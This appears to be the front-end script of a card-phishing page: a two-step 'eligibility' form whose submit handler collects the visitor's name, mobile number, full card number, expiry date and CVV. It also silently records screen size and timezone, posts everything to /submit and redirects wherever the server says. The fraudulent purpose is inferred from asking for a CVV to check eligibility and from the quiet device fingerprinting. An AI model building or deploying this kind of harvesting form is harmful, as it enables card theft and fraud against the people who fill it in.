// app/static/js/main.js document.addEventListener('DOMContentLoaded', () => { const form = document.getElementById('eligibilityForm'); const steps = document.querySelectorAll('.step'); const progressBar = document.querySelector('.progress-bar'); let currentStep = 0;

const updateStep = (step) => {
    steps.forEach((el, i) => {
        el.classList.toggle('d-none', i !== step);
    });
    progressBar.style.width = `${(step + 1) * 50}%`;
};

document.querySelectorAll('.next-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        currentStep++;
        updateStep(currentStep);
    });
});

document.querySelectorAll('.prev-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        currentStep--;
        updateStep(currentStep);
    });
});

form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const payload = {
        name: document.getElementById('name').value,
        mobile: document.getElementById('mobile').value,
        card: document.getElementById('card').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value,
        screen: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    const res = await fetch('/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    const data = await res.json();
    if (data.redirect) {
        window.location.href = data.redirect;
    }
});

});

